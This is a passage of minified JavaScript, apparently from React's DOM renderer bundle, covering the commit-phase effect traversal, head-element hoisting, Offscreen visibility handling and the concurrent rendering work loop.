                var n = l[a]
                  , u = e
                  , c = t
                  , r = c;
                e: for (; r !== null; ) {
                    switch (r.tag) {
                    case 27:
                        if (Ll(r.type)) {
                            Be = r.stateNode,
                            mt = !1;
                            break e
                        }
                        break;
                    case 5:
                        Be = r.stateNode,
                        mt = !1;
                        break e;
                    case 3:
                    case 4:
                        Be = r.stateNode.containerInfo,
                        mt = !0;
                        break e
                    }
                    r = r.return
                }
                if (Be === null)
                    throw Error(o(160));
                _f(u, c, n),
                Be = null,
                mt = !1,
                u = n.alternate,
                u !== null && (u.return = null),
                n.return = null
            }
        if (t.subtreeFlags & 13886)
            for (t = t.child; t !== null; )
                Lf(t, e),
                t = t.sibling
    }
    var Yt = null;
    function Lf(e, t) {
        var l = e.alternate
          , a = e.flags;
        switch (e.tag) {
        case 0:
        case 11:
        case 14:
        case 15:
            ht(t, e),
            pt(e),
            a & 4 && (Cl(3, e, e.return),
            Mn(3, e),
            Cl(5, e, e.return));
            break;
        case 1:
            ht(t, e),
            pt(e),
            a & 512 && ($e || l === null || Kt(l, l.return)),
            a & 64 && sl && (e = e.updateQueue,
            e !== null && (a = e.callbacks,
            a !== null && (l = e.shared.hiddenCallbacks,
            e.shared.hiddenCallbacks = l === null ? a : l.concat(a))));
            break;
        case 26:
            var n = Yt;
            if (ht(t, e),
            pt(e),
            a & 512 && ($e || l === null || Kt(l, l.return)),
            a & 4) {
                var u = l !== null ? l.memoizedState : null;
                if (a = e.memoizedState,
                l === null)
                    if (a === null)
                        if (e.stateNode === null) {
                            e: {
                                a = e.type,
                                l = e.memoizedProps,
                                n = n.ownerDocument || n;
                                t: switch (a) {
                                case "title":
                                    u = n.getElementsByTagName("title")[0],
                                    (!u || u[nn] || u[tt] || u.namespaceURI === "http://www.w3.org/2000/svg" || u.hasAttribute("itemprop")) && (u = n.createElement(a),
                                    n.head.insertBefore(u, n.querySelector("head > title"))),
                                    ut(u, a, l),
                                    u[tt] = e,
                                    Pe(u),
                                    a = u;
                                    break e;
                                case "link":
                                    var c = Ld("link", "href", n).get(a + (l.href || ""));
                                    if (c) {
                                        for (var r = 0; r < c.length; r++)
                                            if (u = c[r],
                                            u.getAttribute("href") === (l.href == null || l.href === "" ? null : l.href) && u.getAttribute("rel") === (l.rel == null ? null : l.rel) && u.getAttribute("title") === (l.title == null ? null : l.title) && u.getAttribute("crossorigin") === (l.crossOrigin == null ? null : l.crossOrigin)) {
                                                c.splice(r, 1);
                                                break t
                                            }
                                    }
                                    u = n.createElement(a),
                                    ut(u, a, l),
                                    n.head.appendChild(u);
                                    break;
                                case "meta":
                                    if (c = Ld("meta", "content", n).get(a + (l.content || ""))) {
                                        for (r = 0; r < c.length; r++)
                                            if (u = c[r],
                                            u.getAttribute("content") === (l.content == null ? null : "" + l.content) && u.getAttribute("name") === (l.name == null ? null : l.name) && u.getAttribute("property") === (l.property == null ? null : l.property) && u.getAttribute("http-equiv") === (l.httpEquiv == null ? null : l.httpEquiv) && u.getAttribute("charset") === (l.charSet == null ? null : l.charSet)) {
                                                c.splice(r, 1);
                                                break t
                                            }
                                    }
                                    u = n.createElement(a),
                                    ut(u, a, l),
                                    n.head.appendChild(u);
                                    break;
                                default:
                                    throw Error(o(468, a))
                                }
                                u[tt] = e,
                                Pe(u),
                                a = u
                            }
                            e.stateNode = a
                        } else
                            Bd(n, e.type, e.stateNode);
                    else
                        e.stateNode = Hd(n, a, e.memoizedProps);
                else
                    u !== a ? (u === null ? l.stateNode !== null && (l = l.stateNode,
                    l.parentNode.removeChild(l)) : u.count--,
                    a === null ? Bd(n, e.type, e.stateNode) : Hd(n, a, e.memoizedProps)) : a === null && e.stateNode !== null && $c(e, e.memoizedProps, l.memoizedProps)
            }
            break;
        case 27:
            ht(t, e),
            pt(e),
            a & 512 && ($e || l === null || Kt(l, l.return)),
            l !== null && a & 4 && $c(e, e.memoizedProps, l.memoizedProps);
            break;
        case 5:
            if (ht(t, e),
            pt(e),
            a & 512 && ($e || l === null || Kt(l, l.return)),
            e.flags & 32) {
                n = e.stateNode;
                try {
                    xa(n, "")
                } catch (K) {
                    De(e, e.return, K)
                }
            }
            a & 4 && e.stateNode != null && (n = e.memoizedProps,
            $c(e, n, l !== null ? l.memoizedProps : n)),
            a & 1024 && (Ic = !0);
            break;
        case 6:
            if (ht(t, e),
            pt(e),
            a & 4) {
                if (e.stateNode === null)
                    throw Error(o(162));
                a = e.memoizedProps,
                l = e.stateNode;
                try {
                    l.nodeValue = a
                } catch (K) {
                    De(e, e.return, K)
                }
            }
            break;
        case 3:
            if (ii = null,
            n = Yt,
            Yt = ni(t.containerInfo),
            ht(t, e),
            Yt = n,
            pt(e),
            a & 4 && l !== null && l.memoizedState.isDehydrated)
                try {
                    Ia(t.containerInfo)
                } catch (K) {
                    De(e, e.return, K)
                }
            Ic && (Ic = !1,
            Bf(e));
            break;
        case 4:
            a = Yt,
            Yt = ni(e.stateNode.containerInfo),
            ht(t, e),
            pt(e),
            Yt = a;
            break;
        case 12:
            ht(t, e),
            pt(e);
            break;
        case 31:
            ht(t, e),
            pt(e),
            a & 4 && (a = e.updateQueue,
            a !== null && (e.updateQueue = null,
            Zu(e, a)));
            break;
        case 13:
            ht(t, e),
            pt(e),
            e.child.flags & 8192 && e.memoizedState !== null != (l !== null && l.memoizedState !== null) && (Ku = Ye()),
            a & 4 && (a = e.updateQueue,
            a !== null && (e.updateQueue = null,
            Zu(e, a)));
            break;
        case 22:
            n = e.memoizedState !== null;
            var h = l !== null && l.memoizedState !== null
              , T = sl
              , M = $e;
            if (sl = T || n,
            $e = M || h,
            ht(t, e),
            $e = M,
            sl = T,
            pt(e),
            a & 8192)
                e: for (t = e.stateNode,
                t._visibility = n ? t._visibility & -2 : t._visibility | 1,
                n && (l === null || h || sl || $e || ca(e)),
                l = null,
                t = e; ; ) {
                    if (t.tag === 5 || t.tag === 26) {
                        if (l === null) {
                            h = l = t;
                            try {
                                if (u = h.stateNode,
                                n)
                                    c = u.style,
                                    typeof c.setProperty == "function" ? c.setProperty("display", "none", "important") : c.display = "none";
                                else {
                                    r = h.stateNode;
                                    var U = h.memoizedProps.style
                                      , A = U != null && U.hasOwnProperty("display") ? U.display : null;
                                    r.style.display = A == null || typeof A == "boolean" ? "" : ("" + A).trim()
                                }
                            } catch (K) {
                                De(h, h.return, K)
                            }
                        }
                    } else if (t.tag === 6) {
                        if (l === null) {
                            h = t;
                            try {
                                h.stateNode.nodeValue = n ? "" : h.memoizedProps
                            } catch (K) {
                                De(h, h.return, K)
                            }
                        }
                    } else if (t.tag === 18) {
                        if (l === null) {
                            h = t;
                            try {
                                var C = h.stateNode;
                                n ? Ad(C, !0) : Ad(h.stateNode, !1)
                            } catch (K) {
                                De(h, h.return, K)
                            }
                        }
                    } else if ((t.tag !== 22 && t.tag !== 23 || t.memoizedState === null || t === e) && t.child !== null) {
                        t.child.return = t,
                        t = t.child;
                        continue
                    }
                    if (t === e)
                        break e;
                    for (; t.sibling === null; ) {
                        if (t.return === null || t.return === e)
                            break e;
                        l === t && (l = null),
                        t = t.return
                    }
                    l === t && (l = null),
                    t.sibling.return = t.return,
                    t = t.sibling
                }
            a & 4 && (a = e.updateQueue,
            a !== null && (l = a.retryQueue,
            l !== null && (a.retryQueue = null,
            Zu(e, l))));
            break;
        case 19:
            ht(t, e),
            pt(e),
            a & 4 && (a = e.updateQueue,
            a !== null && (e.updateQueue = null,
            Zu(e, a)));
            break;
        case 30:
            break;
        case 21:
            break;
        default:
            ht(t, e),
            pt(e)
        }
    }
    function pt(e) {
        var t = e.flags;
        if (t & 2) {
            try {
                for (var l, a = e.return; a !== null; ) {
                    if (Df(a)) {
                        l = a;
                        break
                    }
                    a = a.return
                }
                if (l == null)
                    throw Error(o(160));
                switch (l.tag) {
                case 27:
                    var n = l.stateNode
                      , u = Wc(e);
                    Qu(e, u, n);
                    break;
                case 5:
                    var c = l.stateNode;
                    l.flags & 32 && (xa(c, ""),
                    l.flags &= -33);
                    var r = Wc(e);
                    Qu(e, r, c);
                    break;
                case 3:
                case 4:
                    var h = l.stateNode.containerInfo
                      , T = Wc(e);
                    Fc(e, T, h);
                    break;
                default:
                    throw Error(o(161))
                }
            } catch (M) {
                De(e, e.return, M)
            }
            e.flags &= -3
        }
        t & 4096 && (e.flags &= -4097)
    }
    function Bf(e) {
        if (e.subtreeFlags & 1024)
            for (e = e.child; e !== null; ) {
                var t = e;
                Bf(t),
                t.tag === 5 && t.flags & 1024 && t.stateNode.reset(),
                e = e.sibling
            }
    }
    function rl(e, t) {
        if (t.subtreeFlags & 8772)
            for (t = t.child; t !== null; )
                Mf(e, t.alternate, t),
                t = t.sibling
    }
    function ca(e) {
        for (e = e.child; e !== null; ) {
            var t = e;
            switch (t.tag) {
            case 0:
            case 11:
            case 14:
            case 15:
                Cl(4, t, t.return),
                ca(t);
                break;
            case 1:
                Kt(t, t.return);
                var l = t.stateNode;
                typeof l.componentWillUnmount == "function" && Af(t, t.return, l),
                ca(t);
                break;
            case 27:
                Gn(t.stateNode);
            case 26:
            case 5:
                Kt(t, t.return),
                ca(t);
                break;
            case 22:
                t.memoizedState === null && ca(t);
                break;
            case 30:
                ca(t);
                break;
            default:
                ca(t)
            }
            e = e.sibling
        }
    }
    function fl(e, t, l) {
        for (l = l && (t.subtreeFlags & 8772) !== 0,
        t = t.child; t !== null; ) {
            var a = t.alternate
              , n = e
              , u = t
              , c = u.flags;
            switch (u.tag) {
            case 0:
            case 11:
            case 15:
                fl(n, u, l),
                Mn(4, u);
                break;
            case 1:
                if (fl(n, u, l),
                a = u,
                n = a.stateNode,
                typeof n.componentDidMount == "function")
                    try {
                        n.componentDidMount()
                    } catch (T) {
                        De(a, a.return, T)
                    }
                if (a = u,
                n = a.updateQueue,
                n !== null) {
                    var r = a.stateNode;
                    try {
                        var h = n.shared.hiddenCallbacks;
                        if (h !== null)
                            for (n.shared.hiddenCallbacks = null,
                            n = 0; n < h.length; n++)
                                mr(h[n], r)
                    } catch (T) {
                        De(a, a.return, T)
                    }
                }
                l && c & 64 && Tf(u),
                Rn(u, u.return);
                break;
            case 27:
                Cf(u);
            case 26:
            case 5:
                fl(n, u, l),
                l && a === null && c & 4 && zf(u),
                Rn(u, u.return);
                break;
            case 12:
                fl(n, u, l);
                break;
            case 31:
                fl(n, u, l),
                l && c & 4 && Uf(n, u);
                break;
            case 13:
                fl(n, u, l),
                l && c & 4 && Hf(n, u);
                break;
            case 22:
                u.memoizedState === null && fl(n, u, l),
                Rn(u, u.return);
                break;
            case 30:
                break;
            default:
                fl(n, u, l)
            }
            t = t.sibling
        }
    }
    function Pc(e, t) {
        var l = null;
        e !== null && e.memoizedState !== null && e.memoizedState.cachePool !== null && (l = e.memoizedState.cachePool.pool),
        e = null,
        t.memoizedState !== null && t.memoizedState.cachePool !== null && (e = t.memoizedState.cachePool.pool),
        e !== l && (e != null && e.refCount++,
        l != null && gn(l))
    }
    function es(e, t) {
        e = null,
        t.alternate !== null && (e = t.alternate.memoizedState.cache),
        t = t.memoizedState.cache,
        t !== e && (t.refCount++,
        e != null && gn(e))
    }
    function wt(e, t, l, a) {
        if (t.subtreeFlags & 10256)
            for (t = t.child; t !== null; )
                qf(e, t, l, a),
                t = t.sibling
    }
    function qf(e, t, l, a) {
        var n = t.flags;
        switch (t.tag) {
        case 0:
        case 11:
        case 15:
            wt(e, t, l, a),
            n & 2048 && Mn(9, t);
            break;
        case 1:
            wt(e, t, l, a);
            break;
        case 3:
            wt(e, t, l, a),
            n & 2048 && (e = null,
            t.alternate !== null && (e = t.alternate.memoizedState.cache),
            t = t.memoizedState.cache,
            t !== e && (t.refCount++,
            e != null && gn(e)));
            break;
        case 12:
            if (n & 2048) {
                wt(e, t, l, a),
                e = t.stateNode;
                try {
                    var u = t.memoizedProps
                      , c = u.id
                      , r = u.onPostCommit;
                    typeof r == "function" && r(c, t.alternate === null ? "mount" : "update", e.passiveEffectDuration, -0)
                } catch (h) {
                    De(t, t.return, h)
                }
            } else
                wt(e, t, l, a);
            break;
        case 31:
            wt(e, t, l, a);
            break;
        case 13:
            wt(e, t, l, a);
            break;
        case 23:
            break;
        case 22:
            u = t.stateNode,
            c = t.alternate,
            t.memoizedState !== null ? u._visibility & 2 ? wt(e, t, l, a) : _n(e, t) : u._visibility & 2 ? wt(e, t, l, a) : (u._visibility |= 2,
            Ga(e, t, l, a, (t.subtreeFlags & 10256) !== 0 || !1)),
            n & 2048 && Pc(c, t);
            break;
        case 24:
            wt(e, t, l, a),
            n & 2048 && es(t.alternate, t);
            break;
        default:
            wt(e, t, l, a)
        }
    }
    function Ga(e, t, l, a, n) {
        for (n = n && ((t.subtreeFlags & 10256) !== 0 || !1),
        t = t.child; t !== null; ) {
            var u = e
              , c = t
              , r = l
              , h = a
              , T = c.flags;
            switch (c.tag) {
            case 0:
            case 11:
            case 15:
                Ga(u, c, r, h, n),
                Mn(8, c);
                break;
            case 23:
                break;
            case 22:
                var M = c.stateNode;
                c.memoizedState !== null ? M._visibility & 2 ? Ga(u, c, r, h, n) : _n(u, c) : (M._visibility |= 2,
                Ga(u, c, r, h, n)),
                n && T & 2048 && Pc(c.alternate, c);
                break;
            case 24:
                Ga(u, c, r, h, n),
                n && T & 2048 && es(c.alternate, c);
                break;
            default:
                Ga(u, c, r, h, n)
            }
            t = t.sibling
        }
    }
    function _n(e, t) {
        if (t.subtreeFlags & 10256)
            for (t = t.child; t !== null; ) {
                var l = e
                  , a = t
                  , n = a.flags;
                switch (a.tag) {
                case 22:
                    _n(l, a),
                    n & 2048 && Pc(a.alternate, a);
                    break;
                case 24:
                    _n(l, a),
                    n & 2048 && es(a.alternate, a);
                    break;
                default:
                    _n(l, a)
                }
                t = t.sibling
            }
    }
    var Un = 8192;
    function Xa(e, t, l) {
        if (e.subtreeFlags & Un)
            for (e = e.child; e !== null; )
                Yf(e, t, l),
                e = e.sibling
    }
    function Yf(e, t, l) {
        switch (e.tag) {
        case 26:
            Xa(e, t, l),
            e.flags & Un && e.memoizedState !== null && wp(l, Yt, e.memoizedState, e.memoizedProps);
            break;
        case 5:
            Xa(e, t, l);
            break;
        case 3:
        case 4:
            var a = Yt;
            Yt = ni(e.stateNode.containerInfo),
            Xa(e, t, l),
            Yt = a;
            break;
        case 22:
            e.memoizedState === null && (a = e.alternate,
            a !== null && a.memoizedState !== null ? (a = Un,
            Un = 16777216,
            Xa(e, t, l),
            Un = a) : Xa(e, t, l));
            break;
        default:
            Xa(e, t, l)
        }
    }
    function wf(e) {
        var t = e.alternate;
        if (t !== null && (e = t.child,
        e !== null)) {
            t.child = null;
            do
                t = e.sibling,
                e.sibling = null,
                e = t;
            while (e !== null)
        }
    }
    function Hn(e) {
        var t = e.deletions;
        if ((e.flags & 16) !== 0) {
            if (t !== null)
                for (var l = 0; l < t.length; l++) {
                    var a = t[l];
                    et = a,
                    Xf(a, e)
                }
            wf(e)
        }
        if (e.subtreeFlags & 10256)
            for (e = e.child; e !== null; )
                Gf(e),
                e = e.sibling
    }
    function Gf(e) {
        switch (e.tag) {
        case 0:
        case 11:
        case 15:
            Hn(e),
            e.flags & 2048 && Cl(9, e, e.return);
            break;
        case 3:
            Hn(e);
            break;
        case 12:
            Hn(e);
            break;
        case 22:
            var t = e.stateNode;
            e.memoizedState !== null && t._visibility & 2 && (e.return === null || e.return.tag !== 13) ? (t._visibility &= -3,
            Vu(e)) : Hn(e);
            break;
        default:
            Hn(e)
        }
    }
    function Vu(e) {
        var t = e.deletions;
        if ((e.flags & 16) !== 0) {
            if (t !== null)
                for (var l = 0; l < t.length; l++) {
                    var a = t[l];
                    et = a,
                    Xf(a, e)
                }
            wf(e)
        }
        for (e = e.child; e !== null; ) {
            switch (t = e,
            t.tag) {
            case 0:
            case 11:
            case 15:
                Cl(8, t, t.return),
                Vu(t);
                break;
            case 22:
                l = t.stateNode,
                l._visibility & 2 && (l._visibility &= -3,
                Vu(t));
                break;
            default:
                Vu(t)
            }
            e = e.sibling
        }
    }
    function Xf(e, t) {
        for (; et !== null; ) {
            var l = et;
            switch (l.tag) {
            case 0:
            case 11:
            case 15:
                Cl(8, l, t);
                break;
            case 23:
            case 22:
                if (l.memoizedState !== null && l.memoizedState.cachePool !== null) {
                    var a = l.memoizedState.cachePool.pool;
                    a != null && a.refCount++
                }
                break;
            case 24:
                gn(l.memoizedState.cache)
            }
            if (a = l.child,
            a !== null)
                a.return = l,
                et = a;
            else
                e: for (l = e; et !== null; ) {
                    a = et;
                    var n = a.sibling
                      , u = a.return;
                    if (Rf(a),
                    a === l) {
                        et = null;
                        break e
                    }
                    if (n !== null) {
                        n.return = u,
                        et = n;
                        break e
                    }
                    et = u
                }
        }
    }
    var tp = {
        getCacheForType: function(e) {
            var t = at(Ke)
              , l = t.data.get(e);
            return l === void 0 && (l = e(),
            t.data.set(e, l)),
            l
        },
        cacheSignal: function() {
            return at(Ke).controller.signal
        }
    }
      , lp = typeof WeakMap == "function" ? WeakMap : Map
      , Te = 0
      , Ue = null
      , de = null
      , ve = 0
      , ze = 0
      , Tt = null
      , Ol = !1
      , Qa = !1
      , ts = !1
      , dl = 0
      , Xe = 0
      , Ml = 0
      , sa = 0
      , ls = 0
      , At = 0
      , Za = 0
      , Ln = null
      , vt = null
      , as = !1
      , Ku = 0
      , Qf = 0
      , Ju = 1 / 0
      , ku = null
      , Rl = null
      , We = 0
      , _l = null
      , Va = null
      , ml = 0
      , ns = 0
      , us = null
      , Zf = null
      , Bn = 0
      , is = null;
    function zt() {
        return (Te & 2) !== 0 && ve !== 0 ? ve & -ve : O.T !== null ? ds() : no()
    }
    function Vf() {
        if (At === 0)
            if ((ve & 536870912) === 0 || Se) {
                var e = lu;
                lu <<= 1,
                (lu & 3932160) === 0 && (lu = 262144),
                At = e
            } else
                At = 536870912;
        return e = jt.current,
        e !== null && (e.flags |= 32),
        At
    }
    function yt(e, t, l) {
        (e === Ue && (ze === 2 || ze === 9) || e.cancelPendingCommit !== null) && (Ka(e, 0),
        Ul(e, ve, At, !1)),
        an(e, l),
        ((Te & 2) === 0 || e !== Ue) && (e === Ue && ((Te & 2) === 0 && (sa |= l),
        Xe === 4 && Ul(e, ve, At, !1)),
        Jt(e))
    }
    function Kf(e, t, l) {
        if ((Te & 6) !== 0)
            throw Error(o(327));
        var a = !l && (t & 127) === 0 && (t & e.expiredLanes) === 0 || ln(e, t)
          , n = a ? up(e, t) : ss(e, t, !0)
          , u = a;
        do {
            if (n === 0) {
                Qa && !a && Ul(e, t, 0, !1);
                break
            } else {
                if (l = e.current.alternate,
                u && !ap(l)) {
                    n = ss(e, t, !1),
                    u = !1;
                    continue
                }
                if (n === 2) {
                    if (u = t,
                    e.errorRecoveryDisabledLanes & u)
                        var c = 0;
                    else
                        c = e.pendingLanes & -536870913,
                        c = c !== 0 ? c : c & 536870912 ? 536870912 : 0;
                    if (c !== 0) {
                        t = c;
                        e: {
                            var r = e;
                            n = Ln;
                            var h = r.current.memoizedState.isDehydrated;
                            if (h && (Ka(r, c).flags |= 256),
                            c = ss(r, c, !1),
                            c !== 2) {
                                if (ts && !h) {
                                    r.errorRecoveryDisabledLanes |= u,
                                    sa |= u,
                                    n = 4;
                                    break e
                                }
                                u = vt,
                                vt = n,
                                u !== null && (vt === null ? vt = u : vt.push.apply(vt, u))
                            }
                            n = c
                        }
                        if (u = !1,
                        n !== 2)
                            continue
                    }
                }
                if (n === 1) {
                    Ka(e, 0),
                    Ul(e, t, 0, !0);
                    break
                }
                e: {
                    switch (a = e,
                    u = n,
                    u) {
                    case 0:
                    case 1:
                        throw Error(o(345));
                    case 4:
                        if ((t & 4194048) !== t)
                            break;
                    case 6:
                        Ul(a, t, At, !Ol);
                        break e;
                    case 2:
                        vt = null;
                        break;
                    case 3:
                    case 5:
                        break;
                    default:
                        throw Error(o(329))
                    }
                    if ((t & 62914560) === t && (n = Ku + 300 - Ye(),
                    10 < n)) {
                        if (Ul(a, t, At, !Ol),
                        nu(a, 0, !0) !== 0)
                            break e;
                        ml = t,
                        a.timeoutHandle = jd(Jf.bind(null, a, l, vt, ku, as, t, At, sa, Za, Ol, u, "Throttled", -0, 0), n);
                        break e
                    }
                    Jf(a, l, vt, ku, as, t, At, sa, Za, Ol, u, null, -0, 0)
                }
            }
            break
        } while (!0);
        Jt(e)
    }
    function Jf(e, t, l, a, n, u, c, r, h, T, M, U, A, C) {
        if (e.timeoutHandle = -1,
        U = t.subtreeFlags,
        U & 8192 || (U & 16785408) === 16785408) {
            U = {
                stylesheets: null,
                count: 0,
                imgCount: 0,
                imgBytes: 0,
                suspenseyImages: [],
                waitingForImages: !0,
                waitingForViewTransition: !1,
                unsuspend: It
            },
            Yf(t, u, U);
            var K = (u & 62914560) === u ? Ku - Ye() : (u & 4194048) === u ? Qf - Ye() : 0;
            if (K = Gp(U, K),
            K !== null) {
                ml = u,
                e.cancelPendingCommit = K(td.bind(null, e, t, u, l, a, n, c, r, h, M, U, null, A, C)),
                Ul(e, u, c, !T);
                return
            }
        }
        td(e, t, u, l, a, n, c, r, h)
    }
    function ap(e) {
        for (var t = e; ; ) {
            var l = t.tag;
            if ((l === 0 || l === 11 || l === 15) && t.flags & 16384 && (l = t.updateQueue,
            l !== null && (l = l.stores,
            l !== null)))
                for (var a = 0; a < l.length; a++) {
                    var n = l[a]
                      , u = n.getSnapshot;
                    n = n.value;
                    try {
                        if (!xt(u(), n))
                            return !1
                    } catch {
                        return !1
                    }
                }
            if (l = t.child,
            t.subtreeFlags & 16384 && l !== null)
                l.return = t,
                t = l;
            else {
                if (t === e)
                    break;
                for (; t.sibling === null; ) {
                    if (t.return === null || t.return === e)
                        return !0;
                    t = t.return
                }
                t.sibling.return = t.return,
                t = t.sibling
            }
        }
        return !0
    }
    function Ul(e, t, l, a) {
        t &= ~ls,
        t &= ~sa,
        e.suspendedLanes |= t,
        e.pingedLanes &= ~t,
        a && (e.warmLanes |= t),
        a = e.expirationTimes;
        for (var n = t; 0 < n; ) {
            var u = 31 - bt(n)
              , c = 1 << u;
            a[u] = -1,
            n &= ~c
        }
        l !== 0 && to(e, l, t)
    }
    function $u() {
        return (Te & 6) === 0 ? (qn(0),
        !1) : !0
    }
    function cs() {
        if (de !== null) {
            if (ze === 0)
                var e = de.return;
            else
                e = de,
                ll = Pl = null,
                jc(e),
                La = null,
                bn = 0,
                e = de;
            for (; e !== null; )
                Ef(e.alternate, e),
                e = e.return;
            de = null
        }
    }
    function Ka(e, t) {
        var l = e.timeoutHandle;
        l !== -1 && (e.timeoutHandle = -1,
        jp(l)),
        l = e.cancelPendingCommit,
        l !== null && (e.cancelPendingCommit = null,
        l()),
        ml = 0,
        cs(),
        Ue = e,
        de = l = el(e.current, null),
        ve = t,
        ze = 0,
        Tt = null,
        Ol = !1,
        Qa = ln(e, t),
        ts = !1,
        Za = At = ls = sa = Ml = Xe = 0,
        vt = Ln = null,
        as = !1,
        (t & 8) !== 0 && (t |= t & 32);
        var a = e.entangledLanes;
        if (a !== 0)
            for (e = e.entanglements,
            a &= t; 0 < a; ) {
                var n = 31 - bt(a)
                  , u = 1 << n;
                t |= e[n],
                a &= ~u
            }
        return dl = t,
        vu(),
        l
    }
    function kf(e, t) {
        ce = null,
        O.H = Dn,
        t === Ha || t === Eu ? (t = or(),
        ze = 3) : t === fc ? (t = or(),
        ze = 4) : ze = t === Yc ? 8 : t !== null && typeof t == "object" && typeof t.then == "function" ? 6 : 1,
        Tt = t,
        de === null && (Xe = 1,
        qu(e, Mt(t, e.current)))
    }
    function $f() {
        var e = jt.current;
        return e === null ? !0 : (ve & 4194048) === ve ? Ht === null : (ve & 62914560) === ve || (ve & 536870912) !== 0 ? e === Ht : !1
    }
    function Wf() {
        var e = O.H;
        return O.H = Dn,
        e === null ? Dn : e
    }
    function Ff() {
        var e = O.A;
        return O.A = tp,
        e
    }
    function Wu() {
        Xe = 4,
        Ol || (ve & 4194048) !== ve && jt.current !== null || (Qa = !0),
        (Ml & 134217727) === 0 && (sa & 134217727) === 0 || Ue === null || Ul(Ue, ve, At, !1)
    }
    function ss(e, t, l) {
        var a = Te;
        Te |= 2;
        var n = Wf()
          , u = Ff();
        (Ue !== e || ve !== t) && (ku = null,
        Ka(e, t)),
        t = !1;
        var c = Xe;
        e: do
            try {
                if (ze !== 0 && de !== null) {
                    var r = de
                      , h = Tt;
                    switch (ze) {
                    case 8:
                        cs(),
                        c = 6;
                        break e;
                    case 3:
                    case 2:
                    case 9:
                    case 6:
                        jt.current === null && (t = !0);
                        var T = ze;
                        if (ze = 0,
                        Tt = null,
                        Ja(e, r, h, T),
                        l && Qa) {
                            c = 0;
                            break e
                        }
                        break;
                    default:
                        T = ze,
                        ze = 0,
                        Tt = null,
                        Ja(e, r, h, T)
                    }
                }
                np(),
                c = Xe;
                break
            } catch (M) {
                kf(e, M)
            }
        while (!0);
        return t && e.shellSuspendCounter++,
        ll = Pl = null,
        Te = a,
        O.H = n,
        O.A = u,
        de === null && (Ue = null,
        ve = 0,
        vu()),
        c
    }
    function np() {
        for (; de !== null; )
            If(de)
    }
    function up(e, t) {
        var l = Te;
        Te |= 2;
        var a = Wf()
          , n = Ff();
        Ue !== e || ve !== t ? (ku = null,
        Ju = Ye() + 500,
        Ka(e, t)) : Qa = ln(e, t);
        e: do
            try {
                if (ze !== 0 && de !== null) {
                    t = de;
                    var u = Tt;
                    t: switch (ze) {
                    case 1:
                        ze = 0,
                        Tt = null,
                        Ja(e, t, u, 1);
                        break;
                    case 2:
                    case 9:
                        if (cr(u)) {
                            ze = 0,
                            Tt = null,
                            Pf(t);
                            break
                        }
                        t = function() {
                            ze !== 2 && ze !== 9 || Ue !== e || (ze = 7),
                            Jt(e)
                        }
                        ,
                        u.then(t, t);
                        break e;
                    case 3:
                        ze = 7;
                        break e;
                    case 4:
                        ze = 5;
                        break e;
                    case 7:
                        cr(u) ? (ze = 0,
                        Tt = null,
                        Pf(t)) : (ze = 0,
                        Tt = null,
                        Ja(e, t, u, 7));
                        break;
                    case 5:
                        var c = null;
                        switch (de.tag) {
                        case 26:
                            c = de.memoizedState;
                        case 5:
                        case 27:
                            var r = de;
                            if (c ? qd(c) : r.stateNode.complete) {
                                ze = 0,
                                Tt = null;
                                var h = r.sibling;
                                if (h !== null)
                                    de = h;
                                else {
                                    var T = r.return;
                                    T !== null ? (de = T,
                                    Fu(T)) : de = null
                                }
                                break t
                            }
                        }
                        ze = 0,
                        Tt = null,
                        Ja(e, t, u, 5);
                        break;
                    case 6:
                        ze = 0,
                        Tt = null,
                        Ja(e, t, u, 6);
                        break;
                    case 8:
                        cs(),
                        Xe = 6;
                        break e;
                    default:
                        throw Error(o(462))
                    }
                }
                ip();
                break
            } catch (M) {
                kf(e, M)
            }
        while (!0);
        return ll = Pl = null,
        O.H = a,
        O.A = n,
        Te = l,
        de !== null ? 0 : (Ue = null,
        ve = 0,
        vu(),
        Xe)
    }
    function ip() {
        for (; de !== null && !gt(); )
            If(de)
    }
    function If(e) {
        var t = Nf(e.alternate, e, dl);
        e.memoizedProps = e.pendingProps,
        t === null ? Fu(e) : de = t
    }
    function Pf(e) {
        var t = e
          , l = t.alternate;
        switch (t.tag) {
        case 15:
        case 0:
            t = vf(l, t, t.pendingProps, t.type, void 0, ve);
            break;
        case 11:
            t = vf(l, t, t.pendingProps, t.type.render, t.ref, ve);
            break;
        case 5:
            jc(t);
        default:
            Ef(l, t),
            t = de = Wo(t, dl),
            t = Nf(l, t, dl)
        }
        e.memoizedProps = e.pendingProps,
        t === null ? Fu(e) : de = t
    }
    function Ja(e, t, l, a) {
        ll = Pl = null,
        jc(t),
        La = null,
        bn = 0;
        var n = t.return;
        try {
            if (kh(e, n, t, l, ve)) {
                Xe = 1,
                qu(e, Mt(l, e.current)),
                de = null;
                return
            }
        } catch (u) {
            if (n !== null)
                throw de = n,
                u;
            Xe = 1,
            qu(e, Mt(l, e.current)),
            de = null;
            return
        }
        t.flags & 32768 ? (Se || a === 1 ? e = !0 : Qa || (ve & 536870912) !== 0 ? e = !1 : (Ol = e = !0,
        (a === 2 || a === 9 || a === 3 || a === 6) && (a = jt.current,
        a !== null && a.tag === 13 && (a.flags |= 16384))),
        ed(t, e)) : Fu(t)
    }
    function Fu(e) {
        var t = e;
        do {
            if ((t.flags & 32768) !== 0) {
                ed(t, Ol);
                return
            }
            e = t.return;
            var l = Fh(t.alternate, t, dl);
            if (l !== null) {
                de = l;
                return
            }
            if (t = t.sibling,
            t !== null) {
                de = t;
                return
            }
            de = t = e
        } while (t !== null);
        Xe === 0 && (Xe = 5)
    }
    function ed(e, t) {
        do {
            var l = Ih(e.alternate, e);
            if (l !== null) {
                l.flags &= 32767,
                de = l;
                return
            }
            if (l = e.return,
            l !== null && (l.flags |= 32768,
            l.subtreeFlags = 0,
            l.deletions = null),
            !t && (e = e.sibling,
            e !== null)) {
                de = e;
                return
            }
            de = e = l
        } while (e !== null);
        Xe = 6,
        de = null
    }
    function td(e, t, l, a, n, u, c, r, h) {
        e.cancelPendingCommit = null;
        do
            Iu();
        while (We !== 0);
        if ((Te & 6) !== 0)
            throw Error(o(327));
        if (t !== null) {
            if (t === e.current)
                throw Error(o(177));
            if (u = t.lanes | t.childLanes,
            u |= Wi,
            Ym(e, l, u, c, r, h),
            e === Ue && (de = Ue = null,
            ve = 0),
            Va = t,
            _l = e,
            ml = l,
            ns = u,
            us = n,
            Zf = a,
            (t.subtreeFlags & 10256) !== 0 || (t.flags & 10256) !== 0 ? (e.callbackNode = null,
            e.callbackPriority = 0,
            rp(ha, function() {
                return id(),
                null
            })) : (e.callbackNode = null,
            e.callbackPriority = 0),
            a = (t.flags & 13878) !== 0,
            (t.subtreeFlags & 13878) !== 0 || a) {
                a = O.T,
